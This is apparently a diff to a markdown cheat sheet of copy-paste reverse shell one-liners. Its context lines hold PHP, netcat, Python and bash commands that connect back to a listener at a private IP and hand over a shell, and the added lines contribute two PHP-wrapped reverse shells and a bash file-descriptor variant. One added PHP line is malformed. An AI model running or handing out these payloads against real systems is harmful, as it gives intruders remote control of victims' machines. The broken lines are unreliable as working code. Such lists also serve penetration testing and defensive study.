@@ -8,6 +8,12 @@ Each of the methods below is aimed to be a one-liner that you can copy/paste.  A
 ```
 php -r '$sock=fsockopen("10.18.59.236",4545);exec("/bin/sh -i <&3 >&3 2>&3");'
 ```
+```
+<? php exec("/bin/bash -c 'bash -i >& /dev/tcp/10.0.2.15:4444 0>&1'"); ?>
+```
+```
+<?php -r '$sock=fsockopen("10.18.59.236",4444);exec("/bin/sh -i <&3 >&3 2>&3");' ?>
+```
 # NatCat
 ```
 nc -e /bin/sh 10.18.59.236 2222
@@ -23,6 +29,9 @@ python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOC
 # Bash
 ```
 bash -i >& /dev/tcp/10.18.59.236/4545 0>&1
+```
+```
+0<&196;exec 196<>/dev/tcp/10.18.59.236/4545; sh <&196 >&196 2>&196
 ```
 # Perl
 ```
